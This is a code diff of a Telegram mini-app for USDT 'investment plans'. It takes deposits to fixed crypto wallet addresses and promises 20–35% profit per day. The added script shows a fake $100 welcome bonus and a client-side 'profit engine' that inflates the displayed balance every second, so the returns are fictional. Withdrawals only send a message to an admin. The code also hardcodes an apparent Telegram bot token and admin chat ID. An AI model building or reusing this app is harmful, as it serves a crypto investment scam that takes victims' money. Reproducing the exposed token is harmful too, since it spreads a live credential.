-                    <label>TXID / Transaction Hash</label>
-                    <input type="text" id="deposit-txid" class="form-control" placeholder="Paste your TXID hash">
-                </div>
-                <button class="btn btn-primary" onclick="submitDeposit()">Submit Deposit Request</button>
-                <button class="btn" style="background:transparent; color:var(--text-muted); width:100%; margin-top:8px;" onclick="openPage('home')">Cancel</button>
-            </div>
-        </div>
-
-        <!-- WITHDRAW PAGE -->
-        <div id="page-withdraw" class="page">
-            <h2>Withdraw USDT</h2>
-            <div class="balance-card">
-                <div class="form-group">
-                    <label>Select Network</label>
-                    <select id="withdraw-network" class="form-control">
-                        <option value="TRC20">TRON (TRC20)</option>
-                        <option value="BEP20">BNB Chain (BEP20)</option>
-                    </select>
-                </div>
-                <div class="form-group">
-                    <label>Withdrawal Amount (USDT)</label>
-                    <input type="number" id="withdraw-amount" class="form-control" placeholder="Min $10">
-                </div>
-                <div class="form-group">
-                    <label>Your Wallet Address</label>
-                    <input type="text" id="withdraw-address" class="form-control" placeholder="Enter your USDT wallet address">
-                </div>
-                <button class="btn btn-primary" onclick="submitWithdraw()">Submit Withdrawal Request</button>
-                <button class="btn" style="background:transparent; color:var(--text-muted); width:100%; margin-top:8px;" onclick="openPage('home')">Cancel</button>
+        <div style="margin-top: 20px; background: rgba(9, 13, 22, 0.7); border: 1px solid var(--card-border); border-radius: 14px; padding: 14px;">
+            <label style="margin-bottom: 6px;"><i class="fa-solid fa-link"></i> Your Referral Link</label>
+            <div style="display: flex; gap: 8px;">
+                <input type="text" id="ref-link" value="https://t.me/USDTPilotBot?start=ref_000000" readonly style="margin-bottom: 0; font-size: 12px; font-family: monospace; background: rgba(0,0,0,0.3);">
+                <button class="copy-btn" onclick="copyRefLink()" style="padding: 0 14px; border-radius: 10px; font-weight: 700;"><i class="fa-regular fa-copy"></i> Copy</button>
             </div>
         </div>
     </div>
+</section>
 
-    <!-- Navigation -->
-    <div class="nav-bar">
-        <div class="nav-item active" onclick="openPage('home')">Home</div>
-        <div class="nav-item" onclick="openPage('deposit')">Deposit</div>
-        <div class="nav-item" onclick="openPage('withdraw')">Withdraw</div>
-    </div>
+<!-- Bottom Nav -->
+<nav>
+    <button class="nav-btn active" onclick="openPage('invest', this)">
+        <i class="fa-solid fa-house"></i> Home
+    </button>
+    <button class="nav-btn" onclick="openPage('history', this)">
+        <i class="fa-solid fa-receipt"></i> History
+    </button>
+    <button class="nav-btn" onclick="openPage('stats-page', this)">
+        <i class="fa-solid fa-chart-pie"></i> Stats
+    </button>
+    <button class="nav-btn" onclick="openPage('support', this)">
+        <i class="fa-solid fa-headset"></i> Support
+    </button>
+    <button class="nav-btn" onclick="openPage('profile', this)">
+        <i class="fa-solid fa-user"></i> Profile
+    </button>
+</nav>
 
-    <!-- JAVASCRIPT LOGIC -->
-    <script>
-        // Initialize Telegram WebApp SDK
+</div>
+
+<div id="toast">Message</div>
+
+<script>
+    // TELEGRAM BOT CONFIGURATION
+    const BOT_TOKEN = '8679853739:AAEcdk9DWC51lVO1EXvmamgyWSpkp2Vfdk0';
+    const ADMIN_CHAT_ID = '5738022147';
+
+    // State Data Structure
+    let userState = {
+        balance: 100.00,
+        totalProfit: 0.00,
+        activeInvestment: 0.00,
+        totalDeposited: 100.00,
+        totalWithdrawn: 0.00,
+        investments: [],
+        transactions: [
+            {
+                id: 'TXN891023',
+                type: 'deposit',
+                title: 'Welcome Bonus Deposit',
+                amount: 100.00,
+                status: 'completed',
+                date: new Date().toLocaleDateString(),
+                network: 'SYSTEM'
+            }
+        ]
+    };
+
+    let telegramUser = { id: 5738022147, first_name: "Ismail", last_name: "Essa", username: "ismailessa" };
+
+    const stdAmounts = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100];
+    const vipAmounts = [150, 200, 350, 400, 450, 500];
+
+    const cryptoNetworks = {
+        'TRC20': { name: 'Tron TRC20', tag: 'Tether USD (TRC20)', address: 'TLPVBmQnS6VTV7MwzLzYy7EjUKqsKob7hs', icon: 'https://cryptologos.cc/logos/tron-trx-logo.png' },
+        'BEP20': { name: 'BNB Smart Chain', tag: 'Tether USD (BEP20)', address: '0xe4484af8794b0fe2eccf433f7da7ac81935fc4a0', icon: 'https://cryptologos.cc/logos/bnb-bnb-logo.png' },
+        'ERC20': { name: 'Ethereum ERC20', tag: 'Tether USD (ERC20)', address: '0xe4484af8794b0fe2eccf433f7da7ac81935fc4a0', icon: 'https://cryptologos.cc/logos/ethereum-eth-logo.png' },
+        'TON': { name: 'TON Network', tag: 'Tether USD (TON)', address: 'EQA000000000000000000000000000000000000000000000', icon: 'https://cryptologos.cc/logos/toncoin-ton-logo.png' }
+    };
+
+    let activeHistoryFilter = 'all';
+
+    window.addEventListener('load', () => {
+        setTimeout(() => {
+            const splash = document.getElementById('splash');
+            splash.style.opacity = '0';
+            splash.style.visibility = 'hidden';
+        }, 1000);
+
+        initTelegramUser();
+        renderPlans();
+        updateUI();
+        renderHistory();
+        updateStats();
+        startProfitEngine();
+        updateDepositAddress();
+        updateWithdrawIcon();
+    });
+
+    function initTelegramUser() {
         const tg = window.Telegram?.WebApp;
-        if(tg) { tg.expand(); }
+        if (tg) { tg.ready(); }
 
-        // Configured Telegram Credentials
-        const BOT_TOKEN = '8679853739:AAEcdk9DWC51lVO1EXvmamgyWSpkp2Vfdk0'; 
-        const ADMIN_CHAT_ID = '5738022147';
+        if (tg?.initDataUnsafe?.user) {
+            telegramUser = tg.initDataUnsafe.user;
+        }
 
-        // User Local State
-        let userState = {
-            balance: 0.00
+        const fullName = `${telegramUser.first_name || ''} ${telegramUser.last_name || ''}`.trim() || "User";
+        const usernameStr = telegramUser.username ? `@${telegramUser.username}` : `@user_${telegramUser.id}`;
+        const userIdStr = telegramUser.id ? telegramUser.id.toString() : 'N/A';
+
+        document.getElementById('username').innerText = telegramUser.first_name || "User";
+        document.getElementById('userid').innerText = `ID: ${userIdStr}`;
+        document.getElementById('profile-fullname').innerText = fullName;
+        document.getElementById('profile-username').innerText = usernameStr;
+        document.getElementById('profile-id').innerText = userIdStr;
+        document.getElementById('ref-link').value = `https://t.me/USDTPilotBot?start=ref_${userIdStr}`;
+
+        if (telegramUser.photo_url) {
+            document.getElementById('header-avatar').innerHTML = `<img src="${telegramUser.photo_url}" alt="Avatar">`;
+            document.getElementById('profile-page-avatar').innerHTML = `<img src="${telegramUser.photo_url}" alt="Avatar">`;
+        }
+    }
+
+    async function sendAdminNotification(messageText) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: ADMIN_CHAT_ID,
+                    text: messageText,
+                    parse_mode: 'HTML'
+                })
+            });
+        } catch (error) {
+            console.error("Telegram Admin Notification Error:", error);
+        }
+    }
+
+    function updateDepositAddress() {
+        const netKey = document.getElementById('deposit-network').value;
+        const netData = cryptoNetworks[netKey];
+        document.getElementById('deposit-net-icon').src = netData.icon;
+        document.getElementById('deposit-net-fullname').innerText = netData.name;
+        document.getElementById('deposit-net-tag').innerText = netData.tag;
+        document.getElementById('deposit-address-display').innerText = netData.address;
+    }
+
+    function updateWithdrawIcon() {
+        const netKey = document.getElementById('withdraw-network').value;
+        const netData = cryptoNetworks[netKey];
+        document.getElementById('withdraw-net-icon').src = netData.icon;
+        document.getElementById('withdraw-net-fullname').innerText = netData.name;
+        document.getElementById('withdraw-net-tag').innerText = netData.tag;
+    }
+
+    function renderPlans() {
+        const stdContainer = document.getElementById('standard-plans');
+        const vipContainer = document.getElementById('vip-plans');
+
+        stdContainer.innerHTML = stdAmounts.map(amt => `
+            <div class="plan-card">
+                <span class="plan-badge badge-std">20% / 24h</span>
+                <div class="plan-title">$${amt}</div>
+                <div class="plan-rate">+20% Profit Daily</div>
+                <div class="plan-info">
+                    <span><i class="fa-regular fa-clock"></i> Profit: Hourly</span>
+                    <span><i class="fa-solid fa-lock"></i> Duration: 7 Days</span>
+                    <span><i class="fa-solid fa-coins"></i> Return: $${(amt * 1.4).toFixed(1)}</span>
+                </div>
+                <button class="plan-btn btn-std" onclick="invest(${amt}, 0.20)">Invest Now</button>
+            </div>
+        `).join('');
+
+        vipContainer.innerHTML = vipAmounts.map(amt => `
+            <div class="plan-card vip-card">
+                <span class="plan-badge badge-vip">VIP 35%</span>
+                <div class="plan-title">$${amt}</div>
+                <div class="plan-rate">+35% Profit Daily</div>
+                <div class="plan-info">
+                    <span><i class="fa-regular fa-clock"></i> Profit: Hourly</span>
+                    <span><i class="fa-solid fa-lock"></i> Duration: 7 Days</span>
+                    <span><i class="fa-solid fa-coins"></i> Return: $${(amt * 2.45).toFixed(1)}</span>
+                </div>
+                <button class="plan-btn btn-vip" onclick="invest(${amt}, 0.35)">Invest VIP</button>
+            </div>
+        `).join('');
+    }
+
+    // Submit Deposit + Send Telegram Admin Notification
+    function submitDeposit() {
+        const amt = parseFloat(document.getElementById('deposit-amount').value);
+        const txid = document.getElementById('deposit-txid').value;
+        const net = document.getElementById('deposit-network').value;
+
+        if(!amt || amt < 10) { showToast("Minimum deposit is $10!"); return; }
+        if(!txid) { showToast("Please paste your TXID Hash!"); return; }
+
+        const generatedTxId = 'TXN' + Math.floor(100000 + Math.random() * 900000);
+
+        const txObj = {
+            id: generatedTxId,
+            type: 'deposit',
+            title: `Deposit (${net})`,
+            amount: amt,
+            status: 'pending',
+            date: new Date().toLocaleDateString(),
+            network: net
         };
 
-        // Load Telegram User Profile
-        const tgUser = tg?.initDataUnsafe?.user || {};
-        const uName = tgUser.first_name ? `${tgUser.first_name} ${tgUser.last_name || ''}` : 'User';
-        const uHandle = tgUser.username ? `@${tgUser.username}` : '@no_username';
-        const uId = tgUser.id || 'N/A';
+        userState.transactions.unshift(txObj);
 
-        document.getElementById('u-name').innerText = uName;
-        document.getElementById('u-handle').innerText = uHandle;
-        document.getElementById('u-avatar').innerText = uName.charAt(0).toUpperCase();
+        // Send Notification to Admin
+        const uName = `${telegramUser.first_name || ''} ${telegramUser.last_name || ''}`.trim() || "User";
+        const uHandle = telegramUser.username ? `@${telegramUser.username}` : '@no_username';
 
-        // Helper: Toast Notifications
-        function showToast(msg) {
-            const toast = document.getElementById('toast');
-            toast.innerText = msg;
-            toast.style.display = 'block';
-            setTimeout(() => { toast.style.display = 'none'; }, 3000);
-        }
-
-        // Navigation
-        function openPage(pageId) {
-            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-            document.getElementById(`page-${pageId}`).classList.add('active');
-        }
-
-        // Send Direct Notification to Telegram Admin
-        async function sendAdminNotification(messageText) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            try {
-                await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: ADMIN_CHAT_ID,
-                        text: messageText,
-                        parse_mode: 'HTML'
-                    })
-                });
-            } catch (error) {
-                console.error("Error sending notification to Telegram Admin:", error);
-            }
-        }
-
-        // 1. Submit Deposit Function
-        function submitDeposit() {
-            const amt = parseFloat(document.getElementById('deposit-amount').value);
-            const txid = document.getElementById('deposit-txid').value;
-            const net = document.getElementById('deposit-network').value;
-
-            if(!amt || amt < 10) { showToast("Minimum deposit is $10!"); return; }
-            if(!txid) { showToast("Please enter your TXID Hash!"); return; }
-
-            const txIdGenerated = 'TXN' + Math.floor(100000 + Math.random() * 900000);
-
-            const adminMessage = `
+        const adminMessage = `
 📥 <b>NEW DEPOSIT REQUEST</b>
 ━━━━━━━━━━━━━━━━━━
 👤 <b>User:</b> ${uName} (${uHandle})
-🆔 <b>User ID:</b> <code>${uId}</code>
-🆔 <b>System TXID:</b> <code>${txIdGenerated}</code>
+🆔 <b>User ID:</b> <code>${telegramUser.id}</code>
+🆔 <b>System TXID:</b> <code>${generatedTxId}</code>
 💵 <b>Amount:</b> $${amt.toFixed(2)} USDT
 🌐 <b>Network:</b> ${net}
 🔑 <b>TXID Hash:</b> <code>${txid}</code>
 📅 <b>Date:</b> ${new Date().toLocaleString()}
 ━━━━━━━━━━━━━━━━━━
-⚠️ <i>Please verify TXID manually and update user balance.</i>
-            `;
+⚠️ <i>Verify TXID on blockchain before approving!</i>
+        `;
+        sendAdminNotification(adminMessage);
 
-            sendAdminNotification(adminMessage);
+        document.getElementById('deposit-amount').value = '';
+        document.getElementById('deposit-txid').value = '';
 
-            document.getElementById('deposit-amount').value = '';
-            document.getElementById('deposit-txid').value = '';
+        showToast("Deposit submitted! Status: Pending verification.");
+        renderHistory();
+        updateStats();
+        openPage('history');
+    }
 
-            showToast("Deposit request sent to Admin! Pending verification.");
-            openPage('home');
-        }
+    // Submit Withdraw + Send Telegram Admin Notification
+    function submitWithdraw() {
+        const amt = parseFloat(document.getElementById('withdraw-amount').value);
+        const addr = document.getElementById('withdraw-address').value;
+        const net = document.getElementById('withdraw-network').value;
 
-        // 2. Submit Withdrawal Function
-        function submitWithdraw() {
-            const amt = parseFloat(document.getElementById('withdraw-amount').value);
-            const addr = document.getElementById('withdraw-address').value;
-            const net = document.getElementById('withdraw-network').value;
+        if(!amt || amt < 10) { showToast("Minimum withdrawal is $10!"); return; }
+        if(!addr) { showToast("Please enter destination wallet address!"); return; }
+        if(userState.balance < amt) { showToast("Insufficient balance!"); return; }
 
-            if(!amt || amt < 10) { showToast("Minimum withdrawal is $10!"); return; }
-            if(!addr) { showToast("Please enter your wallet address!"); return; }
-            if(userState.balance < amt) { showToast("Insufficient balance!"); return; }
+        userState.balance -= amt;
+        const generatedTxId = 'TXN' + Math.floor(100000 + Math.random() * 900000);
 
-            userState.balance -= amt;
-            document.getElementById('balance-display').innerText = `$${userState.balance.toFixed(2)} USDT`;
+        const txObj = {
+            id: generatedTxId,
+            type: 'withdraw',
+            title: `Withdraw (${net})`,
+            amount: amt,
+            status: 'pending',
+            date: new Date().toLocaleDateString(),
+            network: net
+        };
 
-            const txIdGenerated = 'TXN' + Math.floor(100000 + Math.random() * 900000);
+        userState.transactions.unshift(txObj);
 
-            const adminMessage = `
+        // Send Notification to Admin
+        const uName = `${telegramUser.first_name || ''} ${telegramUser.last_name || ''}`.trim() || "User";
+        const uHandle = telegramUser.username ? `@${telegramUser.username}` : '@no_username';
+
+        const adminMessage = `
 📤 <b>NEW WITHDRAWAL REQUEST</b>
 ━━━━━━━━━━━━━━━━━━
 👤 <b>User:</b> ${uName} (${uHandle})
-🆔 <b>User ID:</b> <code>${uId}</code>
-🆔 <b>System TXID:</b> <code>${txIdGenerated}</code>
+🆔 <b>User ID:</b> <code>${telegramUser.id}</code>
+🆔 <b>System TXID:</b> <code>${generatedTxId}</code>
 💵 <b>Amount:</b> $${amt.toFixed(2)} USDT
 🌐 <b>Network:</b> ${net}
 💳 <b>Wallet Address:</b> <code>${addr}</code>
 📅 <b>Date:</b> ${new Date().toLocaleString()}
 ━━━━━━━━━━━━━━━━━━
-🚀 <i>Send $${amt.toFixed(2)} USDT to the wallet address above and confirm.</i>
-            `;
+🚀 <i>Send $${amt.toFixed(2)} USDT to user's wallet address!</i>
+        `;
+        sendAdminNotification(adminMessage);
 
-            sendAdminNotification(adminMessage);
+        document.getElementById('withdraw-amount').value = '';
+        document.getElementById('withdraw-address').value = '';
 
-            document.getElementById('withdraw-amount').value = '';
-            document.getElementById('withdraw-address').value = '';
+        updateUI();
+        renderHistory();
+        updateStats();
+        showToast(`Withdrawal of $${amt} submitted! Status: Pending.`);
+        openPage('history');
+    }
 
-            showToast(`Withdrawal request of $${amt} sent to Admin!`);
-            openPage('home');
+    // Invest Action
+    function invest(amount, dailyRate) {
+        if (userState.balance < amount) {
+            showToast("Insufficient Balance! Please deposit first.");
+            return;
         }
-    </script>
+
+        userState.balance -= amount;
+        userState.activeInvestment += amount;
+
+        const hourlyRate = (amount * dailyRate) / 24;
+
+        userState.investments.push({
+            id: Date.now(),
+            amount: amount,
+            hourlyProfit: hourlyRate,
+            dailyRate: dailyRate,
+            startTime: Date.now(),
+            durationDays: 7,
+            totalEarned: 0
+        });
+
+        userState.transactions.unshift({
+            id: 'TXN' + Math.floor(100000 + Math.random() * 900000),
+            type: 'invest',
+            title: `Investment Plan (${dailyRate * 100}%)`,
+            amount: amount,
+            status: 'completed',
+            date: new Date().toLocaleDateString(),
+            network: 'INTERNAL'
+        });
+
+        updateUI();
+        renderHistory();
+        updateStats();
+        showToast(`Successfully invested $${amount}!`);
+    }
+
+    // Filter History
+    function filterHistory(type, btn) {
+        activeHistoryFilter = type;
+        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        renderHistory();
+    }
+
+    // Render History UI
+    function renderHistory() {
+        const container = document.getElementById('history-container');
+        let filtered = userState.transactions;
+
+        if(activeHistoryFilter !== 'all') {
+            filtered = userState.transactions.filter(t => t.type === activeHistoryFilter);
+        }
+
+        if(filtered.length === 0) {
+            container.innerHTML = `<p style="text-align: center; color: var(--text-sub); font-size: 13px; padding: 30px 0;">No transactions found</p>`;
+            return;
+        }
+
+        container.innerHTML = filtered.map(tx => {
+            let iconClass = tx.type === 'deposit' ? 'fa-arrow-down deposit' : (tx.type === 'withdraw' ? 'fa-arrow-up withdraw' : 'fa-chart-line invest');
+            let sign = tx.type === 'deposit' ? '+' : (tx.type === 'withdraw' ? '-' : '');
+            let color = tx.type === 'deposit' ? '#10b981' : (tx.type === 'withdraw' ? '#ef4444' : 'var(--accent-cyan)');
+            let statusDisplay = tx.status === 'completed' ? 'completed' : 'pending';
+            
+            return `
+                <div class="tx-card">
+                    <div class="tx-icon ${tx.type}">
+                        <i class="fa-solid ${iconClass}"></i>
+                    </div>
+                    <div class="tx-details">
+                        <h5>${tx.title}</h5>
+                        <p>${tx.date} • ${tx.id}</p>
+                    </div>
+                    <div class="tx-amount">
+                        <h5 style="color: ${color};">${sign}$${tx.amount.toFixed(2)}</h5>
+                        <span class="status-badge status-${statusDisplay}">${tx.status}</span>
+                    </div>
+                </div>
+            `;
+        }).join('');
+    }
+
+    // Update Stats
+    function updateStats() {
+        document.getElementById('stat-deposits').innerText = `$${userState.totalDeposited.toFixed(2)}`;
+        document.getElementById('stat-withdraws').innerText = `$${userState.totalWithdrawn.toFixed(2)}`;
+        document.getElementById('stat-count').innerText = userState.transactions.length;
+
+        const roi = userState.totalDeposited > 0 ? ((userState.totalProfit / userState.totalDeposited) * 100).toFixed(1) : '0.0';
+        document.getElementById('stat-roi').innerText = `+${roi}%`;
+
+        const target = 1000;
+        const totalCap = userState.balance + userState.activeInvestment;
+        const progress = Math.min((totalCap / target) * 100, 100).toFixed(0);
+
+        document.getElementById('goal-bar').style.width = `${progress}%`;
+        document.getElementById('goal-percent').innerText = `${progress}%`;
+    }
+
+    // Real-time Profit Engine
+    function startProfitEngine() {
+        setInterval(() => {
+            const now = Date.now();
+            let addedProfit = 0;
+
+            userState.investments.forEach((inv, index) => {
+                const elapsedHours = (now - inv.startTime) / (1000 * 60 * 60);
+                if (elapsedHours < (inv.durationDays * 24)) {
+                    const tickProfit = (inv.hourlyProfit / 3600); 
+                    inv.totalEarned += tickProfit;
+                    addedProfit += tickProfit;
+                } else {
+                    userState.balance += inv.amount;
+                    userState.activeInvestment -= inv.amount;
+                    userState.investments.splice(index, 1);
+                    showToast(`Plan $${inv.amount} completed! Capital unlocked.`);
+                }
+            });
+
+            if (addedProfit > 0) {
+                userState.balance += addedProfit;
+                userState.totalProfit += addedProfit;
+                updateUI();
+                updateStats();
+            }
+        }, 1000);
+    }
+
+    function updateUI() {
+        document.getElementById('balance').innerText = userState.balance.toFixed(2);
+        document.getElementById('profit').innerText = userState.totalProfit.toFixed(2);
+        document.getElementById('active').innerText = userState.activeInvestment.toFixed(2);
+    }
+
+    function openPage(pageId, btnElement) {
+        document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
+        document.getElementById(pageId).classList.add('active');
+
+        if(btnElement) {
+            document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('active'));
+            btnElement.classList.add('active');
+        }
+    }
+
+    function copyAddress() {
+        const addr = document.getElementById('deposit-address-display').innerText;
+        navigator.clipboard.writeText(addr);
+        showToast("Wallet Address Copied!");
+    }
+
+    function copyRefLink() {
+        const refInput = document.getElementById('ref-link');
+        refInput.select();
+        navigator.clipboard.writeText(refInput.value);
+        showToast("Referral Link Copied!");
+    }
+
+    function sendTicket() {
+        const sub = document.getElementById('support-subject').value;
+        const msg = document.getElementById('support-msg').value;
+
+        if(!sub || !msg) { showToast("Please fill in all ticket fields!"); return; }
+
+        const ticketMessage = `
+🎫 <b>NEW SUPPORT TICKET</b>
+━━━━━━━━━━━━━━━━━━
+👤 <b>User:</b> ${telegramUser.first_name || 'User'} (@${telegramUser.username || 'none'})
+🆔 <b>User ID:</b> <code>${telegramUser.id}</code>
+📌 <b>Subject:</b> ${sub}
+💬 <b>Message:</b> ${msg}
+━━━━━━━━━━━━━━━━━━
+        `;
+        sendAdminNotification(ticketMessage);
+
+        document.getElementById('support-subject').value = '';
+        document.getElementById('support-msg').value = '';
+        showToast("Support ticket sent! Admin will reply soon.");
+    }
+
+    function showToast(msg) {
+        const toast = document.getElementById('toast');
+        toast.innerText = msg;
+        toast.style.display = 'block';
+        setTimeout(() => { toast.style.display = 'none'; }, 3000);
+    }
+</script>
+
 </body>
 </html>
